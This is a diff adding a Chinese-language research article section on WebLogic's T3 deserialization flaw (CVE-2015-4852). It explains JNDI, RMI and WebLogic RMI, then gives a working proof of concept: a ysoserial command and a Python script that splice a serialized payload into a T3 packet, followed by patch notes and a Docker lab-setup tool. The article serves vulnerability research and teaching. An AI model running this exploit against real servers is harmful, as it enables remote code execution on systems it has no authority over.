@@ -524,5 +524,849 @@ WebLogic xmlDecoder系列漏洞的补丁通常在`weblogic.wsee.workarea.WorkCon
 
 ![53.png](https://nosec.org/avatar/uploads/attach/image/9e6991e89f0ff4f3dee39d555f36b7ce/53.png)
 
+### T3反序列化漏洞
 
+#### 前置知识
+
+在研究WebLogic相关的漏洞的时候大家一定见过JNDI、RMI、JRMP、T3这些概念，简单的说，T3是WebLogic RMI调用时的通信协议，RMI又和JNDI有关系，JRMP是Java远程方法协议。我曾经很不清晰这些概念，甚至混淆。因此在我真正开始介绍T3反序列化漏洞之前，我会对这些概念进行一一介绍。
+
+#### **JNDI**
+
+JNDI\(Java Naming and Directory Interface\)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。 JNDI可以兼容和访问现有目录服务如：DNS、XNam、LDAP、CORBA对象服务、文件系统、RMI、DSML v1&v2、NIS等。
+
+我在这里用DNS做一个不严谨的比喻来理解JNDI。当我们想访问一个网站的时候，我们已经习惯于直接输入域名访问了，但其实远程计算机只有IP地址可供我们访问，那就需要DNS服务做域名的解析，取到对应的主机IP地址。JNDI充当了类似的角色，使用统一的接口去查找对应的不同的服务类型。
+
+![54.png](https://nosec.org/avatar/uploads/attach/image/92800ab4a36fb2746324d24802155426/54.png)
+
+看一下常见的JNDI的例子：
+
+```text
+jdbc://<domain>:<port>rmi://<domain>:<port>ldap://<domain>:<port>
+```
+
+JNDI的查找一般使用`lookup()`方法如`registry.lookup(name)`。
+
+#### **RMI**
+
+RMI\(Remote Method Invocation\)即远程方法调用。能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输和分布垃圾收集。
+
+Java RMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非JVM，如WebLogic的T3和兼容CORBA的IIOP，其中T3协议为本文重点，后面会详细说。
+
+为了更好的理解RMI，我举一个例子：
+
+假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。
+
+这种设计和实现很像当今流行的Web API，只不过RMI只支持Java原生调用，程序员在写代码的时候和调用本地方法并无太大差别，也不用关心数据格式的转换和网络上的传输。类似的做法在ASP.NET中也有同样的实现叫WebServices。
+
+RMI远程方法调用通常由以下几个部分组成：
+
+* 客户端对象
+* 服务端对象
+* 客户端代理对象（stub）
+* 服务端代理对象（skeleton）
+
+下面来看一下最简单的Java RMI要如何实现：
+
+首先创建服务端对象类，先创建一个接口继承`java.rmi.Remote`:
+
+```text
+// IHello.java
+
+import java.rmi.*;
+
+public interface IHello extends Remote {
+
+    public String sayHello() throws RemoteException;
+
+}
+```
+
+然后创建服务端对象类，实现这个接口：
+
+```text
+// Hello.java
+
+public class Hello implements IHello{
+
+    public Hello() {}
+
+    public String sayHello() {
+
+        return "Hello, world!";
+
+    }
+
+}
+```
+
+创建服务端远程对象骨架并绑定在JNDI Registry上：
+
+```text
+// Server.java
+
+import java.rmi.registry.Registry;
+
+import java.rmi.registry.LocateRegistry;
+
+import java.rmi.RemoteException;
+
+import java.rmi.server.UnicastRemoteObject;
+
+  
+
+public class Server{
+
+  
+
+  public Server() throws RemoteException{}
+
+  
+
+  public static void main(String args[]) {
+
+  
+
+  try {
+
+    // 实例化服务端远程对象
+
+      Hello obj = new Hello();
+
+    // 创建服务端远程对象的骨架（skeleton）
+
+      IHello skeleton = (IHello) UnicastRemoteObject.exportObject(obj, 0);
+
+      // 将服务端远程对象的骨架绑定到Registry上
+
+      Registry registry = LocateRegistry.getRegistry();
+
+      registry.bind("Hello", skeleton);
+
+      System.err.println("Server ready");
+
+  } catch (Exception e) {
+
+      System.err.println("Server exception: " + e.toString());
+
+      e.printStackTrace();
+
+  }
+
+  }
+
+}
+```
+
+RMI的服务端已经构建完成，继续关注客户端：
+
+```text
+// Client.java
+
+import java.rmi.registry.LocateRegistry;
+
+import java.rmi.registry.Registry;
+
+public class Client {
+
+    private Client() {}
+
+    public static void main(String[] args) {
+
+  String host = (args.length < 1) ? "127.0.0.1" : args[0];
+
+  try {
+
+      Registry registry = LocateRegistry.getRegistry(host);
+
+      // 创建客户端对象stub（存根）
+
+      IHello stub = (IHello) registry.lookup("Hello");
+
+      // 使用存根调用服务端对象中的方法
+
+      String response = stub.sayHello();
+
+      System.out.println("response: " + response);
+
+  } catch (Exception e) {
+
+      System.err.println("Client exception: " + e.toString());
+
+      e.printStackTrace();
+
+  }
+
+    }
+
+}
+```
+
+至此，简单的RMI服务和客户端已经构建完成，我们来看一下执行效果：
+
+```text
+$ rmiregistry &
+
+[1] 80849
+
+$  java Server &
+
+[2] 80935
+
+Server ready
+
+$  java Client
+
+response: Hello, world!
+```
+
+Java RMI的调用过程抓包如下：
+
+![55.png](https://nosec.org/avatar/uploads/attach/image/8fa0be4c8c3a14ab733b708330633747/55.png)
+
+我们可以清晰的从客户端调用包和服务端返回包中看到Java序列化魔术头`0xac 0xed`：
+
+![56.png](https://nosec.org/avatar/uploads/attach/image/a6016acbcfc68a1fbbbe7fd6e9389b46/56.png)
+
+因此可以证实Java RMI的调用过程是依赖Java序列化和反序列化的。
+
+简单解释一下RMI的整个调用流程：
+
+![57.png](https://nosec.org/avatar/uploads/attach/image/456ac9227a7a1628ea8efc20a36ea1f7/57.png)
+
+1. 客户端通过客户端的Stub对象欲调用远程主机对象上的方法
+2. Stub代理客户端处理远程对象调用请求，并且序列化调用请求后发送网络传输
+3. 服务端远程调用Skeleton对象收到客户端发来的请求，代理服务端反序列化请求，传给服务端
+4. 服务端接收到请求，方法在服务端执行然后将返回的结果对象传给Skeleton对象
+5. Skeleton接收到结果对象，代理服务端将结果序列化，发送给客户端
+6. 客户端Stub对象拿到结果对象，代理客户端反序列化结果对象传给客户端
+
+我们不难发现，Java RMI的实现运用了程序设计模式中的代理模式，其中Stub代理了客户端处理RMI，Skeleton代理了服务端处理RMI。
+
+#### **WebLogic RMI**
+
+WebLogic RMI和T3反序列化漏洞有很大关系，因为T3就是WebLogic RMI所使用的协议。网上关于漏洞的PoC很多，但是我们通过那些PoC只能看到它不正常（漏洞触发）的样子，却很少能看到它正常工作的样子。那么我们就从WebLogic RMI入手，一起看看它应该是什么样的。
+
+**WebLogic RMI就是WebLogic对Java RMI的实现**，它和我刚才讲过的Java RMI大体一致，在功能和实现方式上稍有不同。我们来细数一下WebLogic RMI和Java RMI的不同之处。
+
+* WebLogic RMI支持集群部署和负载均衡
+
+因为WebLogic本身就是为分布式系统设计的，因此WebLogic RMI支持集群部署和负载均衡也不难理解了。
+
+* WebLogic RMI的服务端会使用字节码生成（Hot Code Generation）功能生成代理对象
+
+WebLogic的字节码生成功能会自动生成服务端的字节码到内存。不再生成Skeleton骨架对象，也不需要使用`UnicastRemoteobject`对象。
+
+* WebLogic RMI客户端使用动态代理
+
+在WebLogic RMI 客户端中，字节码生成功能会自动为客户端生成代理对象，因此`Stub`也不再需要。
+
+* **WebLogic RMI主要使用T3协议（还有基于CORBA的IIOP协议）进行客户端到服务端的数据传输**
+
+T3传输协议是WebLogic的自有协议，它有如下特点：
+
+1. 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。
+2. 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。
+
+下面我再简单的实现一下WebLogic RMI，实现依据Oracle的WebLogic 12.2.1的官方文档，但是官方文档有诸多错误，所以我下面的实现和官方文档不尽相同但保证可以运行起来。
+
+首先依然是创建服务端对象类，先创建一个接口继承`java.rmi.Remote`:
+
+```text
+// IHello.java
+
+package examples.rmi.hello;
+
+import java.rmi.RemoteException;
+
+public interface IHello extends java.rmi.Remote {
+
+    String sayHello() throws RemoteException;
+
+}
+```
+
+创建服务端对象类，实现这个接口：
+
+```text
+// HelloImpl.java
+
+public class HelloImpl implements IHello {
+
+    public String sayHello() {
+
+        return "Hello Remote World!!";
+
+    }
+
+}
+```
+
+创建服务端远程对象，此时已不需要`Skeleton`对象和`UnicastRemoteobject`对象：
+
+```text
+// HelloImpl.java
+
+package examples.rmi.hello;
+
+import javax.naming.*;
+
+import java.rmi.RemoteException;
+
+public class HelloImpl implements IHello {
+
+    private String name;
+
+    public HelloImpl(String s) throws RemoteException {
+
+        super();
+
+        name = s;
+
+    }
+
+    public String sayHello() throws java.rmi.RemoteException {
+
+        return "Hello World!";
+
+    }
+
+    public static void main(String args[]) throws Exception {
+
+        try {
+
+            HelloImpl obj = new HelloImpl("HelloServer");
+
+            Context ctx = new InitialContext();
+
+            ctx.bind("HelloServer", obj);
+
+            System.out.println("HelloImpl created and bound in the registry " +
+
+                    "to the name HelloServer");
+
+        } catch (Exception e) {
+
+            System.err.println("HelloImpl.main: an exception occurred:");
+
+            System.err.println(e.getMessage());
+
+            throw e;
+
+        }
+
+    }
+
+}
+```
+
+WebLogic RMI的服务端已经构建完成，客户端也不再需要`Stub`对象：
+
+```text
+// HelloClient.java
+
+package examples.rmi.hello;
+
+import java.util.Hashtable;
+
+import javax.naming.Context;
+
+import javax.naming.InitialContext;
+
+import javax.naming.NamingException;
+
+public class HelloClient {
+
+    // Defines the JNDI context factory.
+
+    public final static String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";
+
+    int port;
+
+    String host;
+
+    private static void usage() {
+
+        System.err.println("Usage: java examples.rmi.hello.HelloClient " +
+
+                "<hostname> <port number>");
+
+    }
+
+    public HelloClient() {
+
+    }
+
+    public static void main(String[] argv) throws Exception {
+
+        if (argv.length < 2) {
+
+            usage();
+
+            return;
+
+        }
+
+        String host = argv[0];
+
+        int port = 0;
+
+        try {
+
+            port = Integer.parseInt(argv[1]);
+
+        } catch (NumberFormatException nfe) {
+
+            usage();
+
+            throw nfe;
+
+        }
+
+        try {
+
+            InitialContext ic = getInitialContext("t3://" + host + ":" + port);
+
+            IHello obj = (IHello) ic.lookup("HelloServer");
+
+            System.out.println("Successfully connected to HelloServer on " +
+
+                    host + " at port " +
+
+                    port + ": " + obj.sayHello());
+
+        } catch (Exception ex) {
+
+            System.err.println("An exception occurred: " + ex.getMessage());
+
+            throw ex;
+
+        }
+
+    }
+
+    private static InitialContext getInitialContext(String url)
+
+            throws NamingException {
+
+        Hashtable<String, String> env = new Hashtable<String, String>();
+
+        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
+
+        env.put(Context.PROVIDER_URL, url);
+
+        return new InitialContext(env);
+
+    }
+
+}
+```
+
+最后记得项目中引入`wlthint3client.jar`这个jar包供客户端调用时可以找到`weblogic.jndi.WLInitialContextFactory`。
+
+简单的WebLogic RMI服务端和客户端已经构建完成，此时我们无法直接运行，需要生成jar包去WebLogic Server 管理控制台中部署运行。
+
+生成jar包可以使用大家常用的build工具，如ant、maven等。我这里提供的是maven的构建配置：
+
+```text
+<?xml version="1.0" encoding="UTF-8"?>
+
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>examples.rmi</groupId>
+
+    <artifactId>hello</artifactId>
+
+    <version>1.0-SNAPSHOT</version>
+
+    <build>
+
+        <plugins>
+
+            <plugin>
+
+                <groupId>org.apache.maven.plugins</groupId>
+
+                <artifactId>maven-compiler-plugin</artifactId>
+
+                <configuration>
+
+                    <source>1.8</source>
+
+                    <target>1.8</target>
+
+                </configuration>
+
+            </plugin>
+
+            <plugin>
+
+                <groupId>org.apache.maven.plugins</groupId>
+
+                <artifactId>maven-jar-plugin</artifactId>
+
+                <configuration>
+
+                    <archive>
+
+                        <manifest>
+
+                            <addClasspath>true</addClasspath>
+
+                            <useUniqueVersions>false</useUniqueVersions>
+
+                            <classpathPrefix>lib/</classpathPrefix>
+
+                            <mainClass>examples.rmi.hello.HelloImpl</mainClass>
+
+                        </manifest>
+
+                    </archive>
+
+                </configuration>
+
+            </plugin>
+
+        </plugins>
+
+    </build>
+
+</project>
+```
+
+构建成功后，将jar包复制到WebLogic Server域对应的`lib/`文件夹中，通过WebLogic Server 管理控制台中的启动类和关闭类部署到WebLogic Server中，新建启动类如下：
+
+![58.png](https://nosec.org/avatar/uploads/attach/image/9107d3dc6d9b2e8ab965319085652db4/58.png)
+
+重启WebLogic，即可在启动日志中看到如下内容：
+
+```text
+HelloImpl created and bound in the registry to the name HelloServer
+```
+
+并且在服务器的JNDI树信息中可以看到`HelloServer`已存在：
+
+![59.png](https://nosec.org/avatar/uploads/attach/image/0beff5915817e3808fc78dacfdf58ce7/59.png)
+
+WebLogic RMI的服务端已经部署完成，客户端只要使用java命令正常运行即可：
+
+```text
+$java -cp ".;wlthint3client.jar;hello-1.0-SNAPSHOT.jar" examples.rmi.hello.HelloClient 127.0.0.1 7001
+```
+
+运行结果如下图：
+
+![60.png](https://nosec.org/avatar/uploads/attach/image/8c1de7b38bbfedc9c6f1337013e4fd80/60.png)
+
+我们完成了一次正常的WebLogic RMI调用过程，我们也来看一下WebLogic RMI的调用数据包：
+
+![61.png](https://nosec.org/avatar/uploads/attach/image/16fa89e218e5774b7366d599b9fe27d9/61.png)
+
+我在抓包之后想过找一份完整的T3协议的定义去详细的解释T3协议，但或许因为WebLogic不是开源软件，我最终没有找到类似的协议定义文档。因此我只能猜测T3协议包中每一部分的作用。虽然是猜测，但还是有几点值得注意，和漏洞利用关系很大，我放到下一节说。
+
+再来看一下WebLogic RMI的调用流程：
+
+![62.png](https://nosec.org/avatar/uploads/attach/image/a402f2952f3de82c39d76a9bc37e421c/62.png)
+
+前置知识讲完了，小结一下这些概念的关系，Java RMI即远程方法调用，默认使用JRMP协议通信。WebLogic RMI是WebLogic对Java RMI的实现，其使用T3或IIOP协议作为通信协议。无论是Java RMI还是WebLogic RMI，都需要使用JNDI去发现远端的RMI服务。
+
+两张图来解释它们的关系：
+
+![63.png](https://nosec.org/avatar/uploads/attach/image/c87feff3d10c1a02b4f72e93ef5ed374/63.png)
+
+#### **漏洞原理**
+
+上面，我详细解释了WebLogic RMI的调用过程，我们初窥了一下T3协议。那么现在我们来仔细看一下刚才抓到的正常WebLogic RMI调用时T3协议握手后的第一个数据包,有几点值得注意的是：
+
+* 我们发现每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）
+* 每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）
+* 每个数据包上面都包含了一个T3协议头
+* 仔细看协议头部分，我们又发现数据包的前4个字节正好对应着数据包长度
+* 以及我们也能发现包长度后面的“01”代表请求，“02”代表返回
+
+![64.png](https://nosec.org/avatar/uploads/attach/image/6a43d143911b4ae3bd883cd75ac78403/64.png)
+
+这些点说明了T3协议由协议头包裹，且数据包中包含多个序列化的对象。那么我们就可以尝试构造恶意对象并封装到数据包中重新发送了。流程如下：
+
+![65.png](https://nosec.org/avatar/uploads/attach/image/cbbccb2fe9f65b59752b0dddad1fa36d/65.png)
+
+替换序列化对象示意图如下：
+
+![66.png](https://nosec.org/avatar/uploads/attach/image/192cde66b334bdd33eede041aeb46a7b/66.png)
+
+剩下的事情就是找到合适的利用链了（通常也是最难的事）。
+
+我用最经典的CVE-2015-4852漏洞，使用Apache Commons Collections链复现一下整个过程，制作一个简单的PoC。
+
+首先使用Ysoserial生成Payload：
+
+```text
+ $java -jar ysoserial.jar CommonsCollections1 'touch /hacked_by_tunan.txt' > payload.bin
+```
+
+然后我们使用Python发送T3协议的握手包，直接复制刚才抓到的第一个包的内容，看下效果如何：
+
+```text
+#!/usr/bin/python
+
+#coding:utf-8
+
+# weblogic_basic_poc.py
+
+import socket
+
+import sys
+
+import struct
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# 第一个和第二个参数，传入目标IP和端口
+
+server_address = (sys.argv[1], int(sys.argv[2]))
+
+print 'connecting to %s port %s' % server_address
+
+sock.connect(server_address)
+
+# 发送握手包
+
+handshake='t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n'
+
+print 'sending "%s"' % handshake
+
+sock.sendall(handshake)
+
+data = sock.recv(1024)
+
+print 'received "%s"' % data
+```
+
+执行一下看结果：
+
+```text
+$python weblogic_basic_poc.py 127.0.0.1 7001
+
+connecting to 127.0.0.1 port 7001
+
+sending "t3 12.1.3
+
+AS:255
+
+HL:19
+
+MS:10000000
+
+"
+
+received "HELO:10.3.6.0.false
+
+AS:2048
+
+HL:19
+
+"
+```
+
+很好，和上面抓到的包一样，握手成功。继续下一步。下一步我需要替换掉握手后的第一个数据包中的一组序列化数据，这个数据包原本是客户端请求WebLogic RMI发的T3协议数据包。假设我们替换第一组序列化数据：
+
+```text
+# weblogic_basic_poc.py
+
+# 第三个参数传入一个文件名，在本例中为刚刚生成的“payload.bin”
+
+payloadObj = open(sys.argv[3],'rb').read()
+
+# 复制自原数据包，从24到155
+
+payload='\x00\x00\x05\xf8\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x72\x00\x00\xea\x60\x00\x00\x00\x19\...omit...\x70\x06\xfe\x01\x00\x00'
+
+# 要替换的Payload
+
+payload=payload+payloadObj
+
+# 复制剩余数据包，从408到1564
+
+payload=payload+'\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61...omit...\x00\x00\x00\x00\x78'
+
+# 重新计算数据包大小并替换原数据包中的前四个字节
+
+payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])
+
+print 'sending payload...'
+
+sock.send(payload)
+```
+
+PoC构造完成，验证下效果：
+
+```text
+$python weblogic_basic_poc.py 127.0.0.1 7001 payload.bin
+
+connecting to 127.0.0.1 port 7001
+
+sending "t3 12.1.3
+
+AS:255
+
+HL:19
+
+MS:10000000
+
+"
+
+received "HELO:10.3.6.0.false
+
+AS:2048
+
+HL:19
+
+"
+
+sending payload...
+```
+
+![67.png](https://nosec.org/avatar/uploads/attach/image/f29783442e05d2b7833f7a6f6d4b3d8b/67.png)
+
+执行后去目标系统根目录下，可以看到`hacked_by_tunan.txt`这个文件被创建成功，漏洞触发成功。
+
+#### **简要漏洞分析**
+
+简要的分析一下这个漏洞，远程调试时断点应下在`wlserver/server/lib/wlthint3client.jar/weblogic/InboundMsgAbbrev`的`readobject()`中。
+
+![68.png](https://nosec.org/avatar/uploads/attach/image/c8ddb20b8267d0fb69d2c5e1ac316b55/68.png)
+
+可以看到此处即对我生成的恶意对象进行了反序列化，此处为第一次反序列化，不是命令的执行点。后续的执行过程和经典的apache-commons-collections反序列化漏洞执行过程一致，需要继续了解可参考@gyyyy的文章：《浅析Java序列化和反序列化——经典的apache-commons-collections》\([https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md\#%E7%BB%8F%E5%85%B8%E7%9A%84apache-commons-collections](https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md#%E7%BB%8F%E5%85%B8%E7%9A%84apache-commons-collections)\)
+
+#### **补丁分析**
+
+WebLogic T3反序列化漏洞用黑名单的方式修复，补丁位置在`Weblogic.utils.io.oif.WebLogicFilterConfig.class`:
+
+![69.png](https://nosec.org/avatar/uploads/attach/image/d544ec9c3a23e16cfb66a1ff21f0bfbe/69.png)
+
+此类型漏洞也经历了多次修复绕过的过程。
+
+#### WebLogic其他漏洞
+
+WebLogic是一个Web漏洞库，其中以反序列化漏洞为代表，后果最为严重。另外还有几个月前爆出的XXE漏洞：CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650、任意文件上传漏洞：CVE-2018-2894。此文不再展开讨论，感兴趣的可以对照上表中的文章详细了解。
+
+## WebLogic环境搭建工具
+
+前面说到，WebLogic环境搭建过程很繁琐，很多时候需要测试各种WebLogic版本和各种JDK版本的排列组合，因此我在这次研究的过程中写了一个脚本级别的WebLogic环境搭建工具。这一小节我会详细的说一下工具的构建思路和使用方法，也欢迎大家继续完善这个工具，节省大家搭建环境的时间。工具地址：[https://github.com/QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)
+
+此环境搭建工具使用Docker和shell脚本，因此需要本机安装Docker才可以使用。经测试漏洞搭建工具可以在3分钟内构建出任意JDK版本搭配任意WebLogic版本，包含一个可远程调试的已启动的WebLogic Server域环境。
+
+#### 需求
+
+* 自动化安装任意版本JDK
+* 自动化安装任意版本WebLogic Server
+* 自动化创建域
+* 自动打开远程调试
+* 自动启动一个WebLogic Server域
+
+#### 流程
+
+![](../.gitbook/assets/image%20%2859%29.png)
+
+#### 使用方法：
+
+**下载JDK安装包和WebLogic安装包**
+
+下载相应的JDK版本和WebLogic安装包，将JDK安装包放到`jdks/`目录下，将WebLogic安装包放到`weblogics/`目录下。**此步骤必须手动操作，否则无法进行后续步骤。**
+
+![71.png](https://nosec.org/avatar/uploads/attach/image/1a8f30a44ddb35fd2204f30fc670ec39/71.png)
+
+JDK安装包下载地址：[https://www.oracle.com/technetwork/java/javase/archive-139210.htmlWebLogic](https://www.oracle.com/technetwork/java/javase/archive-139210.htmlWebLogic)安装包下载地址：[https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html](https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html)
+
+**构建镜像并运行**
+
+回到根目录，执行Docker构建镜像命令：
+
+```text
+docker build --build-arg JDK_PKG=<YOUR-JDK-PACKAGE-FILE-NAME> --build-arg WEBLOGIC_JAR=<YOUR-WEBLOGIC-PACKAGE-FILE-NAME>  -t <DOCKER-IMAGE-NAME> .
+```
+
+镜像构建完成后，执行以下命令运行：
+
+```text
+docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name <CONTAINER-NAME> <DOCKER-IMAGE-NAME-YOU-JUST-BUILD>
+```
+
+以WebLogic12.1.3配JDK 7u21为例，构建镜像命令如下：
+
+```text
+docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.1.3.0.0_wls.jar  -t weblogic12013jdk7u21 .
+```
+
+镜像构建完成后，执行以下命令运行：
+
+```text
+docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic12013jdk7u21 weblogic12013jdk7u21
+```
+
+运行后可访问`[[`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`](`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`)]([`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`](`[`http://localhost:7001/console/login/LoginForm.jsp`](http://localhost:7001/console/login/LoginForm.jsp)`))`登录到WebLogic Server管理控制台，默认用户名为`weblogic`,默认密码为`qaxateam01`
+
+**远程调试**
+
+如需远程调试，需使用`docker cp`将远程调试需要的目录从已运行的容器复制到本机。
+
+也可以使用`run_weblogic1036jdk6u25.sh`、`run_weblogic12013jdk7u21sh`、`run_weblogic12021jdk8u121.sh`这三个脚本进行快速环境搭建并复制远程调试需要用到的目录。执行前请赋予它们相应的可执行权限。
+
+**示例**
+
+以JDK 7u21配合WebLogic 12.1.3为例，自动搭建效果如下：
+
+![](../.gitbook/assets/image%20%2858%29.png)
+
+#### 兼容性测试
+
+已测试了如下环境搭配的兼容性：
+
+* 测试系统：macOS Mojave 10.14.5
+* Docker版本：Docker 18.09.2
+* WebLogic 10.3.6 With JDK 6u25
+* WebLogic 10.3.6 With JDK 7u21
+* WebLogic 10.3.6 With JDK 8u121
+* WebLogic 12.1.3 With JDK 7u21
+* WebLogic 12.1.3 With JDK 8u121
+* WebLogic 12.2.1 With JDK 8u121
+
+#### 已知问题
+
+* 由于时间关系，我没有对更多WebLogic版本和更多的JDK版本搭配做测试，请自行测试
+* 请时刻关注输出内容，如出现异常请自行修改对应脚本
+
+欢迎大家一起为此自动化环境搭建工具贡献力量。
+
+## 总结
+
+分析WebLogic漏洞异常辛苦，因为没有足够的资料去研究。因此想写这篇文帮助大家。但这篇文行文也异常痛苦，同样是没有资料，官方文档还有很多错误，很无奈。希望这篇文能对WebLogic的安全研究者有所帮助。不过通过写这篇文，我发现无论怎样也只是触及到了WebLogic的冰山一角，它很庞大，或者不客气的说很臃肿。我们能了解的太少太少，也注定还有很多点是没有被人开发过，比如WebLogic RMI不止T3一种协议，实现`weblogic.jndi.WLInitialContextFactory`的也不止有`wlthint3client.jar`这一个jar包。还望大家继续深挖。
+
+## 参考
+
+1. [https://xz.aliyun.com/t/5448](https://xz.aliyun.com/t/5448)
+2. [https://paper.seebug.org/584/](https://paper.seebug.org/584/)
+3. [https://paper.seebug.org/333/](https://paper.seebug.org/333/)
+4. [https://xz.aliyun.com/t/1825/\#toc-2](https://xz.aliyun.com/t/1825/#toc-2)
+5. [http://www.saxproject.org/copying.html](http://www.saxproject.org/copying.html)
+6. [https://www.4hou.com/vulnerable/12874.html](https://www.4hou.com/vulnerable/12874.html)
+7. [https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/](https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/)
+8. [https://mp.weixin.qq.com/s/QYrPrctdDJl6sgcKGHdZ7g](https://mp.weixin.qq.com/s/QYrPrctdDJl6sgcKGHdZ7g)
+9. [https://docs.oracle.com/cd/E11035\_01/wls100/client/index.html](https://docs.oracle.com/cd/E11035_01/wls100/client/index.html)
+10. [https://docs.oracle.com/cd/E11035\_01/wls100/client/index.html](https://docs.oracle.com/cd/E11035_01/wls100/client/index.html)
+11. [https://docs.oracle.com/middleware/12212/wls/INTRO/preface.htm\#INTRO119](https://docs.oracle.com/middleware/12212/wls/INTRO/preface.htm#INTRO119)
+12. [https://docs.oracle.com/middleware/1213/wls/WLRMI/preface.htm\#WLRMI101](https://docs.oracle.com/middleware/1213/wls/WLRMI/preface.htm#WLRMI101)
+13. [https://docs.oracle.com/middleware/11119/wls/WLRMI/rmi\_imp.htm\#g1000014983](https://docs.oracle.com/middleware/11119/wls/WLRMI/rmi_imp.htm#g1000014983)
+14. [https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md](https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md)
+15. [http://www.wxylyw.com/2018/11/03/WebLogic-xmlDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](http://www.wxylyw.com/2018/11/03/WebLogic-xmlDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)
+16. [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
+
+◆来源：[奇安信](https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704&chksm=fe7a221ac90dab0cac2aaed6deebe7c56e316f767e2fb91e44e8e08aaa0a48790b4eefb447df&mpshare=1&scene=1&srcid=&sharer_sharetime=1565607726135&sharer_shareid=37947731a17f1281ace10f1fc77146cf&key=e8e84aec0427272da90fdc17f4bdf02bb340c1eb7a12b95f91e0bd42a37b76b919e3b2d20fdbf79e4f262cbca90cb1e29a91ce86770010f67819219ef5c033a219db24ca7e87f72ed8786fa9ba946908&ascene=1&uin=MjMwMDM5OTYzMg%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=l1uvYU9tgLWZe8D9eDAO27kX2BaRjKEi4OgpXzqLM1dXvVoo7n38b4y80UnpE3At)
+
+◆本文版权归原作者所有，如有侵权请联系我们及时删除
 
